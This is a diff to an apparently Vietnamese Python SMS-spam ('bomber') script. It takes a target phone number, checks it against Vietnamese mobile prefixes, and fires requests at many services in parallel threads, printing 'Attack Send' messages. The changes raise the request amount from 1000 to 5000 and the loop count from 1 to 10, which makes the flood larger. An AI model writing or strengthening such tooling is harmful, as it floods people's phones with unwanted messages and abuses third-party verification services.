@@ -1,7 +1,7 @@
 import os
 import requests,os,time,re,json,uuid,random,sys
 from concurrent.futures import ThreadPoolExecutor
-amount = 1000
+amount = 5000
 sdt = input("[ + ] Số điện thoại spam : ")
 while not re.search("^(0?)(3[2-9]|5[6|8|9]|7[0|6-9]|8[0-6|8|9]|9[0-4|6-9])[0-9]{7}$",sdt):
   print("Số Điện Thoại Phải Đủ 10 Số !!")
@@ -3470,7 +3470,7 @@ def run(sdt,i):
   threading.submit(KILO,sdt)
   threading.submit(GAPO,sdt) 
   print("Attack Send | GotoSub.Site | Delay : 1 | Status : Thành Công ",)  
-  for j in range(0, 1):
+  for j in range(0, 10):
     # code trong vòng lặp
     print(f" Bo May La Hacked Trung Hieu\r",end="")
     
